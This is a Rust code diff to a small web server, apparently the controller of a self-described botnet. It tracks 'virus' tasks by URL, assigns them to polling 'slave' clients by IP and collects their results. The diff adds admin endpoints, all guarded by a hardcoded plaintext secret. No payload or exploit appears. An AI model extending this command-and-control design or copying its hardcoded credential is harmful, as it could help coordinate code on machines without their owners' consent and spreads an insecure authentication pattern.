@@ -15,7 +15,7 @@ struct Virus {
     id: u64,
     url: String,
     status: String,
-    out: Option<Vec<u8>>,
+    out: Option<String>,
 }
 
 async fn add_virus(botnetstate: &Arc<BotnetState>, url: &str) -> Virus {
@@ -53,6 +53,10 @@ async fn main() {
         .route("/virus_remove", post(virus_remove_handler))
         .route("/virus_status", post(virus_status_handler))
         .route("/pro", get(pro_handler))
+        .route("/diddy_remove", post(diddy_remove_handler))
+        .route("/diddy_assign_virus", post(diddy_assign_handler))
+        .route("/virus_clear", post(virus_clear_handler))
+        .route("/diddy_clear", post(diddy_clear_handler))
         .with_state(state);
 
     let listener = tokio::net::TcpListener::bind("0.0.0.0:6767").await.unwrap();
@@ -64,7 +68,7 @@ async fn main() {
 }
 
 async fn poll_handler(State(state): State<Arc<BotnetState>>) -> Json<BotnetStateSnapshot> {
-    // /poll отдаёт весь снапшот: и que, и pro — /list больше не нужен
+    // /poll отдаёт весь снапшот: и que, и pro — открытая ручка для слейвов и web ui
     Json(BotnetStateSnapshot {
         que: state.que.lock().await.clone(),
         pro: state.pro.lock().await.clone(),
@@ -79,7 +83,7 @@ struct BotnetStateSnapshot {
 }
 
 async fn pro_handler(State(state): State<Arc<BotnetState>>) -> Json<HashMap<String, u64>> {
-    // ip -> id вируса — чтобы slave мог найти себя в pro
+    // ip -> id вируса — открытая ручка для слейвов
     Json(state.pro.lock().await.clone())
 }
 
@@ -101,12 +105,12 @@ async fn virus_add_handler(
     }
 }
 
-// примнять важные  вычисления
+// принять важные вычисления (открытая ручка — сюда стучатся слейвы)
 #[derive(Deserialize)]
 struct VirusResult {
     id: u64,
     status: String,
-    out: Vec<u8>,
+    out: String,
 }
 
 async fn virus_status_handler(
@@ -116,17 +120,15 @@ async fn virus_status_handler(
     let mut que = state.que.lock().await;
     match body.status.as_str() {
         "cooked" => set_virus_result(&mut que, &body),
-        "fifty" => set_virus_result(&mut que, &body),
         // клиент по out отправил свой ip — кладём пару ip -> id вируса в pro
         "accepted" => {
-            let ip = String::from_utf8_lossy(&body.out).into_owned();
             let mut pro = state.pro.lock().await;
 
             match que.binary_search_by_key(&body.id, |virus| virus.id) {
                 Ok(index) => {
                     if que[index].status == "created" {
                         que[index].status = "accepted".to_owned();
-                        pro.insert(ip, body.id); // pro: ip клиента -> id вируса
+                        pro.insert(body.out.clone(), body.id); // pro: ip клиента -> id вируса
                         format!("virus {} accepted", body.id)
                     } else {
                         format!("virus {} already taken", body.id)
@@ -174,5 +176,86 @@ fn set_virus_result(que: &mut Vec<Virus>, body: &VirusResult) -> String {
             format!("virus {} is {}", body.id, body.status)
         }
         Err(_) => format!("virus {} not found in que", body.id),
+    }
+}
+
+// управление pro: удалить дидди из pro по ip
+#[derive(Deserialize)]
+struct DiddyRemove {
+    ip: String,
+    secret: String,
+}
+
+async fn diddy_remove_handler(
+    State(state): State<Arc<BotnetState>>,
+    Json(body): Json<DiddyRemove>,
+) -> Result<String, StatusCode> {
+    match body.secret.as_str() {
+        "gazan67" => {
+            let mut pro = state.pro.lock().await;
+            match pro.remove(&body.ip) {
+                Some(_) => Ok(format!("diddy {} removed from pro", body.ip)),
+                None => Ok(format!("diddy {} not found in pro", body.ip)),
+            }
+        }
+        _ => Err(StatusCode::UNAUTHORIZED),
+    }
+}
+
+// управление pro: переназначить дидди на другой вирус
+#[derive(Deserialize)]
+struct DiddyAssign {
+    ip: String,
+    id: u64,
+    secret: String,
+}
+
+async fn diddy_assign_handler(
+    State(state): State<Arc<BotnetState>>,
+    Json(body): Json<DiddyAssign>,
+) -> Result<String, StatusCode> {
+    match body.secret.as_str() {
+        "gazan67" => {
+            let mut pro = state.pro.lock().await;
+            pro.insert(body.ip.clone(), body.id);
+            Ok(format!("diddy {} now carries virus {}", body.ip, body.id))
+        }
+        _ => Err(StatusCode::UNAUTHORIZED),
+    }
+}
+
+// вычистить всю очередь разом (кнопка «снести всё» для web ui)
+#[derive(Deserialize)]
+struct SecretOnly {
+    secret: String,
+}
+
+async fn virus_clear_handler(
+    State(state): State<Arc<BotnetState>>,
+    Json(body): Json<SecretOnly>,
+) -> Result<String, StatusCode> {
+    match body.secret.as_str() {
+        "gazan67" => {
+            let mut que = state.que.lock().await;
+            let n = que.len();
+            que.clear();
+            Ok(format!("que очищена, удалено вирусов: {n}"))
+        }
+        _ => Err(StatusCode::UNAUTHORIZED),
+    }
+}
+
+async fn diddy_clear_handler(
+    State(state): State<Arc<BotnetState>>,
+    Json(body): Json<SecretOnly>,
+) -> Result<String, StatusCode> {
+    match body.secret.as_str() {
+        "gazan67" => {
+            let mut pro = state.pro.lock().await;
+            let n = pro.len();
+            pro.clear();
+            Ok(format!("pro очищена, уволено дидди: {n}"))
+        }
+        _ => Err(StatusCode::UNAUTHORIZED),
     }
 }
